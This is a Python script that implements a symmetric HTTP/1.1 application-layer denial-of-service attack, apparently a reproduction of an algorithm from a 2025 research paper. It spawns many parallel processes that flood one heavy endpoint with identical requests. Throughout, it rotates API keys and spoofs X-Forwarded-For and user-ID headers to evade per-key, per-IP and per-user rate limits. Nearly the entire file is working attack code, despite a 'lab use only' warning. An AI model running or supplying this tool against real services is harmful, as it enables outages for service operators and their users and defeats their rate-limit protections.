#!/usr/bin/env python3
"""
Algorithm 3 — Symmetric HTTP/1.1 Attack (Python / httpx / multiprocessing).

Implementation of Algorithm 3 from Sivakumar & Thilagam (IJACSA 16/3, 2025).

A *symmetric* attack repeatedly fires the **same** high-workload request
against the target endpoint identified by Algorithm 2.  To by-pass the
rate-limit policies described in §VI.B (X-API-KEY buckets `AX001*` = 100 rpm,
`BX001*` = 70 rpm, other = 50 rpm; per-IP and per-USER = 100 rpm) we rotate
the `X-API-KEY` (and, optionally, the `X-Forwarded-For` /`X-User-Id`)
headers per request so consecutive calls fall into different rate-limit
buckets — exactly the technique discussed in §II.D ("Updating target paths /
X-Forwarded-For / changing cookies").

Concurrency model:
    --clients   N      → spawn N processes via `multiprocessing.Pool`
    --requests  M      → each process fires M requests in a tight loop
                         (i.e. M * N total requests per run)
    --connections C    → per-process httpx connection pool size

Outputs a CSV of per-request timing + status to results/symmetric_<ts>.csv.

⚠️  Lab use only. Do not point at infrastructure you don't own.

Usage
-----
    python3 algorithm3_symmetric.py \\
        --target  ../results/targets.json \\
        --clients 15 --requests 2000 \\
        --base-url http://localhost:8080
"""
from __future__ import annotations

import argparse
import csv
import itertools
import json
import multiprocessing as mp
import os
import random
import string
import sys
import time
from typing import Iterable

import httpx


OVERLOAD_CODES = {429, 503, 509, 520}


# ---------------------------------------------------------------------------
# Header rotation
# ---------------------------------------------------------------------------
def _rand_suffix(n: int = 8) -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


def make_api_key() -> str:
    """Pick a prefix uniformly so we cycle between the three gateway buckets
    (AX001*, BX001*, *) -> hitting the same key never twice in a row."""
    prefix = random.choice(("AX001-", "BX001-", "ZZ000-"))
    return prefix + _rand_suffix()


def make_headers(extra: dict | None = None) -> dict:
    h = {
        "X-API-KEY": make_api_key(),
        "X-Forwarded-For": f"10.{random.randint(0,255)}.{random.randint(0,255)}"
                           f".{random.randint(1,254)}",
        "X-User-Id": f"u-{_rand_suffix(6)}",
        "User-Agent": f"Algo3-Sym/{_rand_suffix(4)}",
        "Accept": "application/json",
        "Connection": "keep-alive",
    }
    if extra:
        h.update(extra)
    return h


# ---------------------------------------------------------------------------
# Worker
# ---------------------------------------------------------------------------
def _select_target(targets: dict) -> dict:
    """Pick the single heaviest target endpoint for a symmetric attack."""
    heavy = targets.get("heavy_by_latency") or targets.get("target_list") or []
    if not heavy:
        raise SystemExit("[!] No targets found in targets.json")
    return heavy[0]


def _worker(args: tuple) -> list[tuple]:
    (worker_id, base_url, target, requests_n, connections,
     payload, verify_tls) = args

    method = target.get("method", "POST").upper()
    path = target["path"]
    rows: list[tuple] = []

    limits = httpx.Limits(max_keepalive_connections=connections,
                          max_connections=connections)
    timeout = httpx.Timeout(connect=5.0, read=15.0, write=5.0, pool=5.0)

    with httpx.Client(base_url=base_url, http2=False, verify=verify_tls,
                      limits=limits, timeout=timeout,
                      follow_redirects=False) as client:
        for i in range(requests_n):
            headers = make_headers()
            start = time.perf_counter()
            status = -1
            err = ""
            try:
                r = client.request(
                    method,
                    path,
                    headers=headers,
                    json=payload if method != "GET" else None,
                    params=payload if method == "GET" else None,
                )
                status = r.status_code
            except httpx.HTTPError as exc:
                err = type(exc).__name__
            elapsed = time.perf_counter() - start
            rows.append((worker_id, i, time.time(), status,
                         round(elapsed * 1000, 2), err))
    return rows


# ---------------------------------------------------------------------------
def run(base_url: str, target: dict, clients: int, requests_n: int,
        connections: int, payload: dict, out_csv: str,
        verify_tls: bool) -> dict:

    print(f"[+] symmetric attack | target={target['method']} {target['path']}"
          f" | clients={clients} | requests/client={requests_n}"
          f" | total={clients * requests_n}", file=sys.stderr)

    args_iter: Iterable = (
        (i, base_url, target, requests_n, connections, payload, verify_tls)
        for i in range(clients)
    )

    t0 = time.perf_counter()
    with mp.Pool(processes=clients) as pool:
        results = pool.map(_worker, list(args_iter))
    elapsed = time.perf_counter() - t0

    os.makedirs(os.path.dirname(os.path.abspath(out_csv)), exist_ok=True)
    with open(out_csv, "w", newline="") as fh:
        w = csv.writer(fh)
        w.writerow(["worker", "iteration", "epoch", "status", "latency_ms",
                    "error"])
        for batch in results:
            w.writerows(batch)

    flat = list(itertools.chain.from_iterable(results))
    statuses = [r[3] for r in flat]
    latencies = [r[4] for r in flat if r[3] != -1]
    summary = {
        "target": target,
        "clients": clients,
        "requests_per_client": requests_n,
        "total_requests": len(flat),
        "wall_seconds": round(elapsed, 2),
        "rps": round(len(flat) / elapsed, 2) if elapsed else 0,
        "status_breakdown": {
            "2xx": sum(1 for s in statuses if 200 <= s < 300),
            "4xx": sum(1 for s in statuses if 400 <= s < 500),
            "5xx": sum(1 for s in statuses if 500 <= s < 600),
            "overload_429_503_509_520":
                sum(1 for s in statuses if s in OVERLOAD_CODES),
            "transport_errors": sum(1 for s in statuses if s == -1),
        },
        "latency_ms": {
            "min": min(latencies) if latencies else 0,
            "max": max(latencies) if latencies else 0,
            "avg": round(sum(latencies) / len(latencies), 2) if latencies else 0,
        },
        "csv": out_csv,
    }
    print(json.dumps(summary, indent=2))
    return summary


# ---------------------------------------------------------------------------
def main() -> int:
    ap = argparse.ArgumentParser(
        description="Algorithm 3 — symmetric HTTP/1.1 attack")
    ap.add_argument("--target", required=True,
                    help="targets.json produced by algorithm2_identify.py")
    ap.add_argument("--base-url", default=None,
                    help="Override base URL (defaults to targets.json:base_url)")
    ap.add_argument("--clients", type=int, default=15,
                    help="Number of parallel attacker processes.")
    ap.add_argument("--requests", type=int, default=2000,
                    help="Requests per process.")
    ap.add_argument("--connections", type=int, default=32,
                    help="httpx pool size per process.")
    ap.add_argument("--payload", default="{}",
                    help='JSON payload to send (default "{}")')
    ap.add_argument("--insecure", action="store_true",
                    help="Disable TLS verification (lab certs).")
    ap.add_argument("--out", default=None,
                    help="CSV output path "
                         "(default ../results/symmetric_<ts>.csv).")
    args = ap.parse_args()

    with open(args.target) as fh:
        targets = json.load(fh)

    base_url = args.base_url or targets.get("base_url")
    if not base_url:
        ap.error("base URL not supplied and not in targets.json")

    target = _select_target(targets)

    out = args.out or os.path.join(
        os.path.dirname(os.path.abspath(args.target)),
        f"symmetric_{int(time.time())}.csv")

    payload = json.loads(args.payload)
    run(base_url=base_url, target=target,
        clients=args.clients, requests_n=args.requests,
        connections=args.connections, payload=payload,
        out_csv=out, verify_tls=not args.insecure)
    return 0


if __name__ == "__main__":
    sys.exit(main())
